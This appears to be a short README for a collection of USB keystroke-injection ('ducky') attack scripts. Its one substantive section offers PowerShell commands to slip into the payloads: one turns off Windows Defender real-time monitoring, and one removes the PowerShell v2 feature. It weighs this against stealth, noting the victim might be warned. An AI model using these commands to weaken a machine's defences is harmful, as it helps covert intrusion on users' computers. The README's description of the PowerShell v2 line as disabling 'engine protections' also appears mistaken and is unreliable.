# ducky_scripts
Random ducky scripts that have been pulled together.
--more to be added later.
# optional
Add these to the script to disable powershell v2 engine protections and windows defender realtime protection, This is less stealthy since the user might be warned of windows defender being disabled.

Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
Set-MpPreference -DisableRealtimeMonitoring $true
